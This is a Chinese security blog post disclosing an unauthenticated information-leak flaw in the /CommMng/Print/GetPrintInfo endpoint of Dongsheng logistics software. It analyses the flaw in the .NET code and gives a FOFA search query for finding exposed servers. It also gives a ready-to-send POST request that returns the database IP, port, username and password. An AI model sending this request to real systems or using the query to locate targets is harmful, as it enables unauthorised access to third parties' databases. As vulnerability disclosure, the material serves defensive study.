---
title: "东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞"
source: https://mrxn.net/jswz/dongsheng-CommMng-Print-GetPrintInfo-dbstr.html
asset_dir: assets/东胜物流软件-commmngprintgetprintinfo-信息泄露漏洞
---

# 东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/11 08:31
- 412浏览
- [2评论](#comment)
- 13分钟阅读

深入探索

数据库

数据管理

软件

---

# 漏洞简介

东胜物流软件是一款用于物流管理的系统，旨在提供高效的物流操作和数据管理功能。在该软件的 `/CommMng/Print/GetPrintInfo` 接口中存在一个信息泄露漏洞。攻击者可以利用此漏洞，未经授权地获取系统的数据库配置信息，包括但不限于数据库的IP地址、端口、账户名以及密码等敏感数据。这可能导致数据库遭到进一步的恶意访问，从而造成数据[泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)、篡改或对系统造成更深层次的破坏。

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"

# 漏洞分析

深入探索

网络安全会议

文件大小转换

防火墙软件

根据.NET MVC框架特点找到DSWeb.CommMng中对于路由的定义

```
using System.Web.Mvc;

#nullable disable
namespace DSWeb.Areas.CommMng;

public class CommMngAreaRegistration : AreaRegistration
{
  public override string AreaName => "CommMng";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("CommMng_default", "CommMng/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

深入探索

安全

漏洞扫描器

网络安全课程

在DSWeb.CommMng.Controllers下找到**PrintController**里的**GetPrintInfo()**方法

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-001-64f10077a85b.webp)](https://image.mrxn.net/8366829df32e47db8d3b19fbee6299f2.webp)

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-002-00c5717714f3.webp)](https://image.mrxn.net/184a1816521a46f1af8315d65bd732cc.webp)

1. `SqlHelper.ConnectionStringLocalTransaction` 包含数据库连接字符串（通常含服务器地址、用户名、密码）
2. 当 `str2`（RemoteServer）不为空时，该连接字符串被序列化到 JSON 响应中
3. 响应直接返回给客户端：`return new ContentResult() { Content = str3 };`

# 漏洞复现

```
POST /CommMng/Print/GetPrintInfo HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
```

[![东胜物流软件 /CommMng/Print/GetPrintInfo 信息泄露漏洞](images/img-003-773655fe5026.webp)](https://image.mrxn.net/1b95b042b1314465a1e8baea3d33631b.webp)

成功在响应回显数据库连接信息如ip地址、端口、账户、密码等敏感信息。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
